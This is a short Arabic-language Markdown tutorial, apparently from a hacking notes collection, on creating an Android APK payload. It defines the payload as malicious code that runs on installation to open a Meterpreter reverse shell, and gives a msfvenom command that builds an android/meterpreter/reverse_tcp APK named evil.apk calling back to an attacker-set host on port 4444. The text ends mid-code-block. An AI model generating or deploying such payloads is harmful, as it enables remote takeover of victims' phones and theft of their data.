
<!-- apk-payload.md -->

               __   ____  _  __          _      _ 
              / /  |  _ \(_)/ _| ___  __| | ___| |
             / /   | |_) | | |_ / _ \/ _` |/ _ \ |
            / /    |  __/| |  _|  __/ (_| |  __/ |
           /_/     |_|   |_|_|  \___|\__,_|\___|_|
                                                  
# إنشاء APK Payload

## 1. تعريف Payload
- Payload: كود خبيث مدموج داخل APK يشتغل فور تثبيته على الجهاز.  
- الهدف: إنشاء اتصال عكسي (reverse shell) عبر Meterpreter.

## 2. خطوات الإنشاء
1. افتح Kali Linux Terminal.  
2. نفّذ الأمر التالي:
   ```bash
   msfvenom -p android/meterpreter/reverse_tcp \
     LHOST=<IP_DYALK> LPORT=4444 \
     -o evil.apk
